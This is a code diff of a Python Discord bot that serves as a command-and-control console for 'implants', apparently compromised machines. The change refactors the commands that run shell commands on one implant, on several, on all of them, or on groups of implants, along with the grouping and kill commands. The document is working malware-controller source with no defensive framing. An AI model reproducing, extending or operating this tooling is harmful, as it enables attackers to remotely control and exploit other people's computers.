@@ -169,7 +169,7 @@ async def delete_session_entry(i_id):
 
 ## get string containing implant info
 def get_implant_data_str():
-	return f'ID: `{implant.id}` | HN: `{implant.hostname}` | IP: `{implant.ip}` | OS: `{implant.os}` | User: `{implant.user}`{f' | Note: `{implant.note}`' if not implant.note == "" else ""}'
+	return f'ID: `{implant.id}` | HN: `{implant.hostname}` | IP: `{implant.ip}` | OS: `{implant.os}` | Usr: `{implant.user}` | Gps: `{implant.groups}`{f' | Note: `{implant.note}`' if not implant.note == "" else ""}'
 
 ## helpers for running a command
 ### actually run the command
@@ -349,27 +349,7 @@ async def ping(ctx):
 	# Send it to the user
 	await reply_thread_once(ctx, f'Current latency: `{latency}`s')
 
-@bot.command(rest_is_raw=True)
-async def cmd(ctx, *, arg):
-	'''
-	Run a command on a/multiple implants
-
-	>cmd -i [implant_id] [command]
-		specific implant
-	>cmd -a [command]
-		all implants
-	>cmd -w [command]
-		windows implants
-	>cmd -l [command]
-		linux implants
-	>cmd -m [implant_id],[implant_id],...[implant_id] [command]
-		multiple implants in csv no whitespace
-	>cmd -g [group_id] [command]
-		command to all implants in a group
-	'''
-	
-	arg = arg[1::]
-
+async def __cmd(ctx, arg):
 	log_info(f'Command recieved: {arg}')
 
 	flag = arg[:2]
@@ -394,9 +374,29 @@ async def cmd(ctx, *, arg):
 
 	log_good(f'Finished processing command: {arg}')
 
+@bot.command(rest_is_raw=True)
+async def cmd(ctx, *, arg):
+	'''
+	Run a command on a/multiple implants
+
+	>cmd -i [implant_id] [command]
+		specific implant
+	>cmd -a [command]
+		all implants
+	>cmd -w [command]
+		windows implants
+	>cmd -l [command]
+		linux implants
+	>cmd -m [implant_id],[implant_id],...[implant_id] [command]
+		multiple implants in csv no whitespace
+	>cmd -g [group_id] [command]
+		command to all implants in a group
+	'''
+	await __cmd(ctx, arg)
+
 @bot.command()
 async def c(ctx, *, arg):
-	await cmd(ctx, arg) #idk if this will work
+	await __cmd(ctx, arg)
 
 @bot.command()
 async def change_id(ctx, arg1, arg2):
@@ -462,13 +462,7 @@ async def kill(ctx, arg):
 async def k(ctx, arg):
 	await kill(ctx, arg)
 
-@bot.command()
-async def add_to_group(ctx, *, arg):
-	'''
-	>add_to_group [group_id] [list of implant ids]
-	'''
-	
-	arg = arg[1::]
+async def _add_to_group(ctx, arg):
 	gp_id = arg[:arg.index(" ")]
 	arg = arg[(arg.index(" ")+1):]
 	implants = arg.split(",")
@@ -478,16 +472,17 @@ async def add_to_group(ctx, *, arg):
 			await reply_thread(ctx, f'Added implant {implant.id} to group {gp_id}')
 
 @bot.command()
-async def agp(ctx, *, arg):
-	await add_to_group(ctx, arg)
-
-@bot.command()
-async def remove_from_group(ctx, *, arg):
+async def add_to_group(ctx, *, arg):
 	'''
-	>remove_from_group [group_id] [list of implant ids]
+	>add_to_group [group_id] [list of implant ids]
 	'''
+	await _add_to_group(ctx, arg)
 	
-	arg = arg[1::]
+@bot.command()
+async def agp(ctx, *, arg):
+	await _add_to_group(ctx, arg)
+
+async def _remove_from_group(ctx, arg):
 	gp_id = arg[:arg.index(" ")]
 	arg = arg[(arg.index(" ")+1):]
 	implants = arg.split(",")
@@ -497,8 +492,15 @@ async def remove_from_group(ctx, *, arg):
 			await reply_thread(ctx, f'Removed implant {implant.id} from group {gp_id}')
 
 @bot.command()
+async def remove_from_group(ctx, *, arg):
+	'''
+	>remove_from_group [group_id] [list of implant ids]
+	'''
+	await _remove_from_group(ctx, arg)
+	
+@bot.command()
 async def rgp(ctx, *, arg):
-	await remove_from_group(ctx, arg)
+	await _remove_from_group(ctx, arg)
 
 f = open("token.txt", "r")
 bot.run(f.read())
